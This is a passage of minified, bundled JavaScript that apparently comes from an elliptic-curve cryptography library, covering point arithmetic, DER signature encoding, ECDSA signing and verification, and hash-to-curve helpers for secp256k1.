a(A,R,S){const{windowSize:v,mask:k,maxNumber:O,shiftBy:_}=S;let I=Number(A&k),T=A>>_;I>v&&(I-=O,T+=r);const B=R*v,U=B+Math.abs(I)-1,M=I===0,N=I<0,q=R%2!==0;return{nextN:T,offset:U,isZero:M,isNeg:N,isNegF:q,offsetF:B}}function c(A,R){if(!Array.isArray(A))throw new Error("array expected");A.forEach((S,v)=>{if(!(S instanceof R))throw new Error("invalid point at index "+v)})}function l(A,R){if(!Array.isArray(A))throw new Error("array of scalars expected");A.forEach((S,v)=>{if(!R.isValid(S))throw new Error("invalid scalar at index "+v)})}const f=new WeakMap,h=new WeakMap;function m(A){return h.get(A)||1}function b(A,R){return{constTimeNegate:i,hasPrecomputes(S){return m(S)!==1},unsafeLadder(S,v,k=A.ZERO){let O=S;for(;v>n;)v&r&&(k=k.add(O)),O=O.double(),v>>=r;return k},precomputeWindow(S,v){const{windows:k,windowSize:O}=o(v,R),_=[];let I=S,T=I;for(let B=0;B<k;B++){T=I,_.push(T);for(let U=1;U<O;U++)T=T.add(I),_.push(T);I=T.double()}return _},wNAF(S,v,k){let O=A.ZERO,_=A.BASE;const I=o(S,R);for(let T=0;T<I.windows;T++){const{nextN:B,offset:U,isZero:M,isNeg:N,isNegF:q,offsetF:P}=a(k,T,I);k=B,M?_=_.add(i(q,v[P])):O=O.add(i(N,v[U]))}return{p:O,f:_}},wNAFUnsafe(S,v,k,O=A.ZERO){const _=o(S,R);for(let I=0;I<_.windows&&k!==n;I++){const{nextN:T,offset:B,isZero:U,isNeg:M}=a(k,I,_);if(k=T,!U){const N=v[B];O=O.add(M?N.negate():N)}}return O},getPrecomputes(S,v,k){let O=f.get(v);return O||(O=this.precomputeWindow(v,S),S!==1&&f.set(v,k(O))),O},wNAFCached(S,v,k){const O=m(S);return this.wNAF(O,this.getPrecomputes(O,S,k),v)},wNAFCachedUnsafe(S,v,k,O){const _=m(S);return _===1?this.unsafeLadder(S,v,O):this.wNAFUnsafe(_,this.getPrecomputes(_,S,k),v,O)},setWindowSize(S,v){s(v,R),h.set(S,v),f.delete(S)}}}function w(A,R,S,v){c(S,A),l(v,R);const k=S.length,O=v.length;if(k!==O)throw new Error("arrays of points and scalars must have equal length");const _=A.ZERO,I=(0,e.bitLen)(BigInt(k));let T=1;I>12?T=I-3:I>4?T=I-2:I>0&&(T=2);const B=(0,e.bitMask)(T),U=new Array(Number(B)+1).fill(_),M=Math.floor((R.BITS-1)/T)*T;let N=_;for(let q=M;q>=0;q-=T){U.fill(_);for(let C=0;C<O;C++){const j=v[C],z=Number(j>>BigInt(q)&B);U[z]=U[z].add(S[C])}let P=_;for(let C=U.length-1,j=_;C>0;C--)j=j.add(U[C]),P=P.add(j);if(N=N.add(P),q!==0)for(let C=0;C<T;C++)N=N.double()}return N}function y(A,R,S,v){s(v,R.BITS),c(S,A);const k=A.ZERO,O=2**v-1,_=Math.ceil(R.BITS/v),I=(0,e.bitMask)(v),T=S.map(B=>{const U=[];for(let M=0,N=B;M<O;M++)U.push(N),N=N.add(B);return U});return B=>{if(l(B,R),B.length>S.length)throw new Error("array of scalars must be smaller than array of points");let U=k;for(let M=0;M<_;M++){if(U!==k)for(let q=0;q<v;q++)U=U.double();const N=BigInt(_*v-(M+1)*v);for(let q=0;q<B.length;q++){const P=B[q],C=Number(P>>N&I);C&&(U=U.add(T[q][C-1]))}}return U}}function E(A){return(0,t.validateField)(A.Fp),(0,e.validateObject)(A,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...(0,t.nLength)(A.n,A.nBitLength),...A,p:A.Fp.ORDER})}return lm}var fY;function mle(){return fY||(fY=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.DER=t.DERErr=void 0,t.weierstrassPoints=b,t.weierstrass=y,t.SWUFpSqrtRatio=E,t.mapToCurveSimpleSWU=A;const e=MFe(),n=z8(),r=cy();function i(R){R.lowS!==void 0&&(0,r.abool)("lowS",R.lowS),R.prehash!==void 0&&(0,r.abool)("prehash",R.prehash)}function s(R){const S=(0,e.validateBasic)(R);(0,r.validateObject)(S,{a:"field",b:"field"},{allowInfinityPoint:"boolean",allowedPrivateKeyLengths:"array",clearCofactor:"function",fromBytes:"function",isTorsionFree:"function",toBytes:"function",wrapPrivateKey:"boolean"});const{endo:v,Fp:k,a:O}=S;if(v){if(!k.eql(O,k.ZERO))throw new Error("invalid endo: CURVE.a must be 0");if(typeof v!="object"||typeof v.beta!="bigint"||typeof v.splitScalar!="function")throw new Error('invalid endo: expected "beta": bigint and "splitScalar": function')}return Object.freeze({...S})}class o extends Error{constructor(S=""){super(S)}}t.DERErr=o,t.DER={Err:o,_tlv:{encode:(R,S)=>{const{Err:v}=t.DER;if(R<0||R>256)throw new v("tlv.encode: wrong tag");if(S.length&1)throw new v("tlv.encode: unpadded data");const k=S.length/2,O=(0,r.numberToHexUnpadded)(k);if(O.length/2&128)throw new v("tlv.encode: long form length too big");const _=k>127?(0,r.numberToHexUnpadded)(O.length/2|128):"";return(0,r.numberToHexUnpadded)(R)+_+O+S},decode(R,S){const{Err:v}=t.DER;let k=0;if(R<0||R>256)throw new v("tlv.encode: wrong tag");if(S.length<2||S[k++]!==R)throw new v("tlv.decode: wrong tlv");const O=S[k++],_=!!(O&128);let I=0;if(!_)I=O;else{const B=O&127;if(!B)throw new v("tlv.decode(long): indefinite length not supported");if(B>4)throw new v("tlv.decode(long): byte length is too big");const U=S.subarray(k,k+B);if(U.length!==B)throw new v("tlv.decode: length bytes not complete");if(U[0]===0)throw new v("tlv.decode(long): zero leftmost byte");for(const M of U)I=I<<8|M;if(k+=B,I<128)throw new v("tlv.decode(long): not minimal encoding")}const T=S.subarray(k,k+I);if(T.length!==I)throw new v("tlv.decode: wrong value length");return{v:T,l:S.subarray(k+I)}}},_int:{encode(R){const{Err:S}=t.DER;if(R<c)throw new S("integer: negative integers are not allowed");let v=(0,r.numberToHexUnpadded)(R);if(Number.parseInt(v[0],16)&8&&(v="00"+v),v.length&1)throw new S("unexpected DER parsing assertion: unpadded hex");return v},decode(R){const{Err:S}=t.DER;if(R[0]&128)throw new S("invalid signature integer: negative");if(R[0]===0&&!(R[1]&128))throw new S("invalid signature integer: unnecessary leading zero");return(0,r.bytesToNumberBE)(R)}},toSig(R){const{Err:S,_int:v,_tlv:k}=t.DER,O=(0,r.ensureBytes)("signature",R),{v:_,l:I}=k.decode(48,O);if(I.length)throw new S("invalid signature: left bytes after parsing");const{v:T,l:B}=k.decode(2,_),{v:U,l:M}=k.decode(2,B);if(M.length)throw new S("invalid signature: left bytes after parsing");return{r:v.decode(T),s:v.decode(U)}},hexFromSig(R){const{_tlv:S,_int:v}=t.DER,k=S.encode(2,v.encode(R.r)),O=S.encode(2,v.encode(R.s)),_=k+O;return S.encode(48,_)}};function a(R,S){return(0,r.bytesToHex)((0,r.numberToBytesBE)(R,S))}const c=BigInt(0),l=BigInt(1),f=BigInt(2),h=BigInt(3),m=BigInt(4);function b(R){const S=s(R),{Fp:v}=S,k=(0,n.Field)(S.n,S.nBitLength),O=S.toBytes||((L,V,G)=>{const Z=V.toAffine();return(0,r.concatBytes)(Uint8Array.from([4]),v.toBytes(Z.x),v.toBytes(Z.y))}),_=S.fromBytes||(L=>{const V=L.subarray(1),G=v.fromBytes(V.subarray(0,v.BYTES)),Z=v.fromBytes(V.subarray(v.BYTES,2*v.BYTES));return{x:G,y:Z}});function I(L){const{a:V,b:G}=S,Z=v.sqr(L),J=v.mul(Z,L);return v.add(v.add(J,v.mul(L,V)),G)}function T(L,V){const G=v.sqr(V),Z=I(L);return v.eql(G,Z)}if(!T(S.Gx,S.Gy))throw new Error("bad curve params: generator point");const B=v.mul(v.pow(S.a,h),m),U=v.mul(v.sqr(S.b),BigInt(27));if(v.is0(v.add(B,U)))throw new Error("bad curve params: a or b");function M(L){return(0,r.inRange)(L,l,S.n)}function N(L){const{allowedPrivateKeyLengths:V,nByteLength:G,wrapPrivateKey:Z,n:J}=S;if(V&&typeof L!="bigint"){if((0,r.isBytes)(L)&&(L=(0,r.bytesToHex)(L)),typeof L!="string"||!V.includes(L.length))throw new Error("invalid private key");L=L.padStart(G*2,"0")}let ne;try{ne=typeof L=="bigint"?L:(0,r.bytesToNumberBE)((0,r.ensureBytes)("private key",L,G))}catch{throw new Error("invalid private key, expected hex or "+G+" bytes, got "+typeof L)}return Z&&(ne=(0,n.mod)(ne,J)),(0,r.aInRange)("private key",ne,l,J),ne}function q(L){if(!(L instanceof j))throw new Error("ProjectivePoint expected")}const P=(0,r.memoized)((L,V)=>{const{px:G,py:Z,pz:J}=L;if(v.eql(J,v.ONE))return{x:G,y:Z};const ne=L.is0();V==null&&(V=ne?v.ONE:v.inv(J));const re=v.mul(G,V),le=v.mul(Z,V),oe=v.mul(J,V);if(ne)return{x:v.ZERO,y:v.ZERO};if(!v.eql(oe,v.ONE))throw new Error("invZ was invalid");return{x:re,y:le}}),C=(0,r.memoized)(L=>{if(L.is0()){if(S.allowInfinityPoint&&!v.is0(L.py))return;throw new Error("bad point: ZERO")}const{x:V,y:G}=L.toAffine();if(!v.isValid(V)||!v.isValid(G))throw new Error("bad point: x or y not FE");if(!T(V,G))throw new Error("bad point: equation left != right");if(!L.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class j{constructor(V,G,Z){if(V==null||!v.isValid(V))throw new Error("x required");if(G==null||!v.isValid(G)||v.is0(G))throw new Error("y required");if(Z==null||!v.isValid(Z))throw new Error("z required");this.px=V,this.py=G,this.pz=Z,Object.freeze(this)}static fromAffine(V){const{x:G,y:Z}=V||{};if(!V||!v.isValid(G)||!v.isValid(Z))throw new Error("invalid affine point");if(V instanceof j)throw new Error("projective point not allowed");const J=ne=>v.eql(ne,v.ZERO);return J(G)&&J(Z)?j.ZERO:new j(G,Z,v.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(V){const G=(0,n.FpInvertBatch)(v,V.map(Z=>Z.pz));return V.map((Z,J)=>Z.toAffine(G[J])).map(j.fromAffine)}static fromHex(V){const G=j.fromAffine(_((0,r.ensureBytes)("pointHex",V)));return G.assertValidity(),G}static fromPrivateKey(V){return j.BASE.multiply(N(V))}static msm(V,G){return(0,e.pippenger)(j,k,V,G)}_setWindowSize(V){H.setWindowSize(this,V)}assertValidity(){C(this)}hasEvenY(){const{y:V}=this.toAffine();if(v.isOdd)return!v.isOdd(V);throw new Error("Field doesn't support isOdd")}equals(V){q(V);const{px:G,py:Z,pz:J}=this,{px:ne,py:re,pz:le}=V,oe=v.eql(v.mul(G,le),v.mul(ne,J)),ue=v.eql(v.mul(Z,le),v.mul(re,J));return oe&&ue}negate(){return new j(this.px,v.neg(this.py),this.pz)}double(){const{a:V,b:G}=S,Z=v.mul(G,h),{px:J,py:ne,pz:re}=this;let le=v.ZERO,oe=v.ZERO,ue=v.ZERO,be=v.mul(J,J),Me=v.mul(ne,ne),Te=v.mul(re,re),Oe=v.mul(J,ne);return Oe=v.add(Oe,Oe),ue=v.mul(J,re),ue=v.add(ue,ue),le=v.mul(V,ue),oe=v.mul(Z,Te),oe=v.add(le,oe),le=v.sub(Me,oe),oe=v.add(Me,oe),oe=v.mul(le,oe),le=v.mul(Oe,le),ue=v.mul(Z,ue),Te=v.mul(V,Te),Oe=v.sub(be,Te),Oe=v.mul(V,Oe),Oe=v.add(Oe,ue),ue=v.add(be,be),be=v.add(ue,be),be=v.add(be,Te),be=v.mul(be,Oe),oe=v.add(oe,be),Te=v.mul(ne,re),Te=v.add(Te,Te),be=v.mul(Te,Oe),le=v.sub(le,be),ue=v.mul(Te,Me),ue=v.add(ue,ue),ue=v.add(ue,ue),new j(le,oe,ue)}add(V){q(V);const{px:G,py:Z,pz:J}=this,{px:ne,py:re,pz:le}=V;let oe=v.ZERO,ue=v.ZERO,be=v.ZERO;const Me=S.a,Te=v.mul(S.b,h);let Oe=v.mul(G,ne),Ke=v.mul(Z,re),it=v.mul(J,le),at=v.add(G,Z),At=v.add(ne,re);at=v.mul(at,At),At=v.add(Oe,Ke),at=v.sub(at,At),At=v.add(G,J);let Et=v.add(ne,le);return At=v.mul(At,Et),Et=v.add(Oe,it),At=v.sub(At,Et),Et=v.add(Z,J),oe=v.add(re,le),Et=v.mul(Et,oe),oe=v.add(Ke,it),Et=v.sub(Et,oe),be=v.mul(Me,At),oe=v.mul(Te,it),be=v.add(oe,be),oe=v.sub(Ke,be),be=v.add(Ke,be),ue=v.mul(oe,be),Ke=v.add(Oe,Oe),Ke=v.add(Ke,Oe),it=v.mul(Me,it),At=v.mul(Te,At),Ke=v.add(Ke,it),it=v.sub(Oe,it),it=v.mul(Me,it),At=v.add(At,it),Oe=v.mul(Ke,At),ue=v.add(ue,Oe),Oe=v.mul(Et,At),oe=v.mul(at,oe),oe=v.sub(oe,Oe),Oe=v.mul(at,Ke),be=v.mul(Et,be),be=v.add(be,Oe),new j(oe,ue,be)}subtract(V){return this.add(V.negate())}is0(){return this.equals(j.ZERO)}wNAF(V){return H.wNAFCached(this,V,j.normalizeZ)}multiplyUnsafe(V){const{endo:G,n:Z}=S;(0,r.aInRange)("scalar",V,c,Z);const J=j.ZERO;if(V===c)return J;if(this.is0()||V===l)return this;if(!G||H.hasPrecomputes(this))return H.wNAFCachedUnsafe(this,V,j.normalizeZ);let{k1neg:ne,k1:re,k2neg:le,k2:oe}=G.splitScalar(V),ue=J,be=J,Me=this;for(;re>c||oe>c;)re&l&&(ue=ue.add(Me)),oe&l&&(be=be.add(Me)),Me=Me.double(),re>>=l,oe>>=l;return ne&&(ue=ue.negate()),le&&(be=be.negate()),be=new j(v.mul(be.px,G.beta),be.py,be.pz),ue.add(be)}multiply(V){const{endo:G,n:Z}=S;(0,r.aInRange)("scalar",V,l,Z);let J,ne;if(G){const{k1neg:re,k1:le,k2neg:oe,k2:ue}=G.splitScalar(V);let{p:be,f:Me}=this.wNAF(le),{p:Te,f:Oe}=this.wNAF(ue);be=H.constTimeNegate(re,be),Te=H.constTimeNegate(oe,Te),Te=new j(v.mul(Te.px,G.beta),Te.py,Te.pz),J=be.add(Te),ne=Me.add(Oe)}else{const{p:re,f:le}=this.wNAF(V);J=re,ne=le}return j.normalizeZ([J,ne])[0]}multiplyAndAddUnsafe(V,G,Z){const J=j.BASE,ne=(le,oe)=>oe===c||oe===l||!le.equals(J)?le.multiplyUnsafe(oe):le.multiply(oe),re=ne(this,G).add(ne(V,Z));return re.is0()?void 0:re}toAffine(V){return P(this,V)}isTorsionFree(){const{h:V,isTorsionFree:G}=S;if(V===l)return!0;if(G)return G(j,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:V,clearCofactor:G}=S;return V===l?this:G?G(j,this):this.multiplyUnsafe(S.h)}toRawBytes(V=!0){return(0,r.abool)("isCompressed",V),this.assertValidity(),O(j,this,V)}toHex(V=!0){return(0,r.abool)("isCompressed",V),(0,r.bytesToHex)(this.toRawBytes(V))}}j.BASE=new j(S.Gx,S.Gy,v.ONE),j.ZERO=new j(v.ZERO,v.ONE,v.ZERO);const{endo:z,nBitLength:$}=S,H=(0,e.wNAF)(j,z?Math.ceil($/2):$);return{CURVE:S,ProjectivePoint:j,normPrivateKeyToScalar:N,weierstrassEquation:I,isWithinCurveOrder:M}}function w(R){const S=(0,e.validateBasic)(R);return(0,r.validateObject)(S,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...S})}function y(R){const S=w(R),{Fp:v,n:k,nByteLength:O,nBitLength:_}=S,I=v.BYTES+1,T=2*v.BYTES+1;function B(Te){return(0,n.mod)(Te,k)}function U(Te){return(0,n.invert)(Te,k)}const{ProjectivePoint:M,normPrivateKeyToScalar:N,weierstrassEquation:q,isWithinCurveOrder:P}=b({...S,toBytes(Te,Oe,Ke){const it=Oe.toAffine(),at=v.toBytes(it.x),At=r.concatBytes;return(0,r.abool)("isCompressed",Ke),Ke?At(Uint8Array.from([Oe.hasEvenY()?2:3]),at):At(Uint8Array.from([4]),at,v.toBytes(it.y))},fromBytes(Te){const Oe=Te.length,Ke=Te[0],it=Te.subarray(1);if(Oe===I&&(Ke===2||Ke===3)){const at=(0,r.bytesToNumberBE)(it);if(!(0,r.inRange)(at,l,v.ORDER))throw new Error("Point is not on curve");const At=q(at);let Et;try{Et=v.sqrt(At)}catch(xn){const Ln=xn instanceof Error?": "+xn.message:"";throw new Error("Point is not on curve"+Ln)}const ze=(Et&l)===l;return(Ke&1)===1!==ze&&(Et=v.neg(Et)),{x:at,y:Et}}else if(Oe===T&&Ke===4){const at=v.fromBytes(it.subarray(0,v.BYTES)),At=v.fromBytes(it.subarray(v.BYTES,2*v.BYTES));return{x:at,y:At}}else{const at=I,At=T;throw new Error("invalid Point, expected length of "+at+", or uncompressed "+At+", got "+Oe)}}});function C(Te){const Oe=k>>l;return Te>Oe}function j(Te){return C(Te)?B(-Te):Te}const z=(Te,Oe,Ke)=>(0,r.bytesToNumberBE)(Te.slice(Oe,Ke));class ${constructor(Oe,Ke,it){(0,r.aInRange)("r",Oe,l,k),(0,r.aInRange)("s",Ke,l,k),this.r=Oe,this.s=Ke,it!=null&&(this.recovery=it),Object.freeze(this)}static fromCompact(Oe){const Ke=O;return Oe=(0,r.ensureBytes)("compactSignature",Oe,Ke*2),new $(z(Oe,0,Ke),z(Oe,Ke,2*Ke))}static fromDER(Oe){const{r:Ke,s:it}=t.DER.toSig((0,r.ensureBytes)("DER",Oe));return new $(Ke,it)}assertValidity(){}addRecoveryBit(Oe){return new $(this.r,this.s,Oe)}recoverPublicKey(Oe){const{r:Ke,s:it,recovery:at}=this,At=J((0,r.ensureBytes)("msgHash",Oe));if(at==null||![0,1,2,3].includes(at))throw new Error("recovery id invalid");const Et=at===2||at===3?Ke+S.n:Ke;if(Et>=v.ORDER)throw new Error("recovery id 2 or 3 invalid");const ze=(at&1)===0?"02":"03",Re=M.fromHex(ze+a(Et,v.BYTES)),xn=U(Et),Ln=B(-At*xn),Nn=B(it*xn),Ne=M.BASE.multiplyAndAddUnsafe(Re,Ln,Nn);if(!Ne)throw new Error("point at infinify");return Ne.assertValidity(),Ne}hasHighS(){return C(this.s)}normalizeS(){return this.hasHighS()?new $(this.r,B(-this.s),this.recovery):this}toDERRawBytes(){return(0,r.hexToBytes)(this.toDERHex())}toDERHex(){return t.DER.hexFromSig(this)}toCompactRawBytes(){return(0,r.hexToBytes)(this.toCompactHex())}toCompactHex(){const Oe=O;return a(this.r,Oe)+a(this.s,Oe)}}const H={isValidPrivateKey(Te){try{return N(Te),!0}catch{return!1}},normPrivateKeyToScalar:N,randomPrivateKey:()=>{const Te=(0,n.getMinHashLength)(S.n);return(0,n.mapHashToField)(S.randomBytes(Te),S.n)},precompute(Te=8,Oe=M.BASE){return Oe._setWindowSize(Te),Oe.multiply(BigInt(3)),Oe}};function L(Te,Oe=!0){return M.fromPrivateKey(Te).toRawBytes(Oe)}function V(Te){if(typeof Te=="bigint")return!1;if(Te instanceof M)return!0;const Ke=(0,r.ensureBytes)("key",Te).length,it=v.BYTES,at=it+1,At=2*it+1;if(!(S.allowedPrivateKeyLengths||O===at))return Ke===at||Ke===At}function G(Te,Oe,Ke=!0){if(V(Te)===!0)throw new Error("first arg must be private key");if(V(Oe)===!1)throw new Error("second arg must be public key");return M.fromHex(Oe).multiply(N(Te)).toRawBytes(Ke)}const Z=S.bits2int||function(Te){if(Te.length>8192)throw new Error("input is too large");const Oe=(0,r.bytesToNumberBE)(Te),Ke=Te.length*8-_;return Ke>0?Oe>>BigInt(Ke):Oe},J=S.bits2int_modN||function(Te){return B(Z(Te))},ne=(0,r.bitMask)(_);function re(Te){return(0,r.aInRange)("num < 2^"+_,Te,c,ne),(0,r.numberToBytesBE)(Te,O)}function le(Te,Oe,Ke=oe){if(["recovered","canonical"].some(Qe=>Qe in Ke))throw new Error("sign() legacy options not supported");const{hash:it,randomBytes:at}=S;let{lowS:At,prehash:Et,extraEntropy:ze}=Ke;At==null&&(At=!0),Te=(0,r.ensureBytes)("msgHash",Te),i(Ke),Et&&(Te=(0,r.ensureBytes)("prehashed msgHash",it(Te)));const Re=J(Te),xn=N(Oe),Ln=[re(xn),re(Re)];if(ze!=null&&ze!==!1){const Qe=ze===!0?at(v.BYTES):ze;Ln.push((0,r.ensureBytes)("extraEntropy",Qe))}const Nn=(0,r.concatBytes)(...Ln),Ne=Re;function Ve(Qe){const dt=Z(Qe);if(!P(dt))return;const cr=U(dt),ui=M.BASE.multiply(dt).toAffine(),ks=B(ui.x);if(ks===c)return;const eo=B(cr*B(Ne+ks*xn));if(eo===c)return;let Hr=(ui.x===ks?0:2)|Number(ui.y&l),xr=eo;return At&&C(eo)&&(xr=j(eo),Hr^=1),new $(ks,xr,Hr)}return{seed:Nn,k2sig:Ve}}const oe={lowS:S.lowS,prehash:!1},ue={lowS:S.lowS,prehash:!1};function be(Te,Oe,Ke=oe){const{seed:it,k2sig:at}=le(Te,Oe,Ke),At=S;return(0,r.createHmacDrbg)(At.hash.outputLen,At.nByteLength,At.hmac)(it,at)}M.BASE._setWindowSize(8);function Me(Te,Oe,Ke,it=ue){const at=Te;Oe=(0,r.ensureBytes)("msgHash",Oe),Ke=(0,r.ensureBytes)("publicKey",Ke);const{lowS:At,prehash:Et,format:ze}=it;if(i(it),"strict"in it)throw new Error("options.strict was renamed to lowS");if(ze!==void 0&&ze!=="compact"&&ze!=="der")throw new Error("format must be compact or der");const Re=typeof at=="string"||(0,r.isBytes)(at),xn=!Re&&!ze&&typeof at=="object"&&at!==null&&typeof at.r=="bigint"&&typeof at.s=="bigint";if(!Re&&!xn)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let Ln,Nn;try{if(xn&&(Ln=new $(at.r,at.s)),Re){try{ze!=="compact"&&(Ln=$.fromDER(at))}catch(Hr){if(!(Hr instanceof t.DER.Err))throw Hr}!Ln&&ze!=="der"&&(Ln=$.fromCompact(at))}Nn=M.fromHex(Ke)}catch{return!1}if(!Ln||At&&Ln.hasHighS())return!1;Et&&(Oe=S.hash(Oe));const{r:Ne,s:Ve}=Ln,Qe=J(Oe),dt=U(Ve),cr=B(Qe*dt),ui=B(Ne*dt),ks=M.BASE.multiplyAndAddUnsafe(Nn,cr,ui)?.toAffine();return ks?B(ks.x)===Ne:!1}return{CURVE:S,getPublicKey:L,getSharedSecret:G,sign:be,verify:Me,ProjectivePoint:M,Signature:$,utils:H}}function E(R,S){const v=R.ORDER;let k=c;for(let C=v-l;C%f===c;C/=f)k+=l;const O=k,_=f<<O-l-l,I=_*f,T=(v-l)/I,B=(T-l)/f,U=I-l,M=_,N=R.pow(S,T),q=R.pow(S,(T+l)/f);let P=(C,j)=>{let z=N,$=R.pow(j,U),H=R.sqr($);H=R.mul(H,j);let L=R.mul(C,H);L=R.pow(L,B),L=R.mul(L,$),$=R.mul(L,j),H=R.mul(L,C);let V=R.mul(H,$);L=R.pow(V,M);let G=R.eql(L,R.ONE);$=R.mul(H,q),L=R.mul(V,z),H=R.cmov($,H,G),V=R.cmov(L,V,G);for(let Z=O;Z>l;Z--){let J=Z-f;J=f<<J-l;let ne=R.pow(V,J);const re=R.eql(ne,R.ONE);$=R.mul(H,z),z=R.mul(z,z),ne=R.mul(V,z),H=R.cmov($,H,re),V=R.cmov(ne,V,re)}return{isValid:G,value:H}};if(R.ORDER%m===h){const C=(R.ORDER-h)/m,j=R.sqrt(R.neg(S));P=(z,$)=>{let H=R.sqr($);const L=R.mul(z,$);H=R.mul(H,L);let V=R.pow(H,C);V=R.mul(V,L);const G=R.mul(V,j),Z=R.mul(R.sqr(V),$),J=R.eql(Z,z);let ne=R.cmov(G,V,J);return{isValid:J,value:ne}}}return P}function A(R,S){if((0,n.validateField)(R),!R.isValid(S.A)||!R.isValid(S.B)||!R.isValid(S.Z))throw new Error("mapToCurveSimpleSWU: invalid opts");const v=E(R,S.Z);if(!R.isOdd)throw new Error("Fp.isOdd is not implemented!");return k=>{let O,_,I,T,B,U,M,N;O=R.sqr(k),O=R.mul(O,S.Z),_=R.sqr(O),_=R.add(_,O),I=R.add(_,R.ONE),I=R.mul(I,S.B),T=R.cmov(S.Z,R.neg(_),!R.eql(_,R.ZERO)),T=R.mul(T,S.A),_=R.sqr(I),U=R.sqr(T),B=R.mul(U,S.A),_=R.add(_,B),_=R.mul(_,I),U=R.mul(U,T),B=R.mul(U,S.B),_=R.add(_,B),M=R.mul(O,I);const{isValid:q,value:P}=v(_,U);N=R.mul(O,k),N=R.mul(N,P),M=R.cmov(M,I,q),N=R.cmov(N,P,q);const C=R.isOdd(k)===R.isOdd(N);N=R.cmov(R.neg(N),N,C);const j=(0,n.FpInvertBatch)(R,[T],!0)[0];return M=R.mul(M,j),{x:M,y:N}}}})(ZO)),ZO}var hY;function UFe(){if(hY)return p2;hY=1,Object.defineProperty(p2,"__esModule",{value:!0}),p2.getHash=r,p2.createCurve=i;const t=jFe(),e=i0(),n=mle();function r(s){return{hash:s,hmac:(o,...a)=>(0,t.hmac)(s,o,(0,e.concatBytes)(...a)),randomBytes:e.randomBytes}}function i(s,o){const a=c=>(0,n.weierstrass)({...s,...r(c)});return{...a(o),create:a}}return p2}var np={},pY;function LFe(){if(pY)return np;pY=1,Object.defineProperty(np,"__esModule",{value:!0}),np.expand_message_xmd=o,np.expand_message_xof=a,np.hash_to_field=c,np.isogenyMap=l,np.createHasher=f;const t=z8(),e=cy(),n=e.bytesToNumberBE;function r(h,m){if(s(h),s(m),h<0||h>=1<<8*m)throw new Error("invalid I2OSP input: "+h);const b=Array.from({length:m}).fill(0);for(let w=m-1;w>=0;w--)b[w]=h&255,h>>>=8;return new Uint8Array(b)}function i(h,m){const b=new Uint8Array(h.length);for(let w=0;w<h.length;w++)b[w]=h[w]^m[w];return b}function s(h){if(!Number.isSafeInteger(h))throw new Error("number expected")}function o(h,m,b,w){(0,e.abytes)(h),(0,e.abytes)(m),s(b),m.length>255&&(m=w((0,e.concatBytes)((0,e.utf8ToBytes)("H2C-OVERSIZE-DST-"),m)));const{outputLen:y,blockLen:E}=w,A=Math.ceil(b/y);if(b>65535||A>255)throw new Error("expand_message_xmd: invalid lenInBytes");const R=(0,e.concatBytes)(m,r(m.length,1)),S=r(0,E),v=r(b,2),k=new Array(A),O=w((0,e.concatBytes)(S,h,v,r(0,1),R));k[0]=w((0,e.concatBytes)(O,r(1,1),R));for(let I=1;I<=A;I++){const T=[i(O,k[I-1]),r(I+1,1),R];k[I]=w((0,e.concatBytes)(...T))}return(0,e.concatBytes)(...k).slice(0,b)}function a(h,m,b,w,y){if((0,e.abytes)(h),(0,e.abytes)(m),s(b),m.length>255){const E=Math.ceil(2*w/8);m=y.create({dkLen:E}).update((0,e.utf8ToBytes)("H2C-OVERSIZE-DST-")).update(m).digest()}if(b>65535||m.length>255)throw new Error("expand_message_xof: invalid lenInBytes");return y.create({dkLen:b}).update(h).update(r(b,2)).update(m).update(r(m.length,1)).digest()}function c(h,m,b){(0,e.validateObject)(b,{DST:"stringOrUint8Array",p:"bigint",m:"isSafeInteger",k:"isSafeInteger",hash:"hash"});const{p:w,k:y,m:E,hash:A,expand:R,DST:S}=b;(0,e.abytes)(h),s(m);const v=typeof S=="string"?(0,e.utf8ToBytes)(S):S,k=w.toString(2).length,O=Math.ceil((k+y)/8),_=m*E*O;let I;if(R==="xmd")I=o(h,v,_,A);else if(R==="xof")I=a(h,v,_,y,A);else if(R==="_internal_pass")I=h;else throw new Error('expand must be "xmd" or "xof"');const T=new Array(m);for(let B=0;B<m;B++){const U=new Array(E);for(let M=0;M<E;M++){const N=O*(M+B*E),q=I.subarray(N,N+O);U[M]=(0,t.mod)(n(q),w)}T[B]=U}return T}function l(h,m){const b=m.map(w=>Array.from(w).reverse());return(w,y)=>{const[E,A,R,S]=b.map(O=>O.reduce((_,I)=>h.add(h.mul(_,w),I))),[v,k]=(0,t.FpInvertBatch)(h,[A,S],!0);return w=h.mul(E,v),y=h.mul(y,h.mul(R,k)),{x:w,y}}}function f(h,m,b){if(typeof m!="function")throw new Error("mapToCurve() must be defined");function w(E){return h.fromAffine(m(E))}function y(E){const A=E.clearCofactor();return A.equals(h.ZERO)?h.ZERO:(A.assertValidity(),A)}return{defaults:b,hashToCurve(E,A){const R=c(E,2,{...b,DST:b.DST,...A}),S=w(R[0]),v=w(R[1]);return y(S.add(v))},encodeToCurve(E,A){const R=c(E,1,{...b,DST:b.encodeDST,...A});return y(w(R[0]))},mapToCurve(E){if(!Array.isArray(E))throw new Error("expected array of bigints");for(const A of E)if(typeof A!="bigint")throw new Error("expected array of bigints");return y(w(E))}}}return np}var mY;function uy(){return mY||(mY=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.encodeToCurve=t.hashToCurve=t.secp256k1_hasher=t.schnorr=t.secp256k1=void 0;const e=ple(),n=i0(),r=UFe(),i=LFe(),s=z8(),o=cy(),a=mle(),c=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),l=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),f=BigInt(0),h=BigInt(1),m=BigInt(2),b=(j,z)=>(j+z/m)/z;function w(j){const 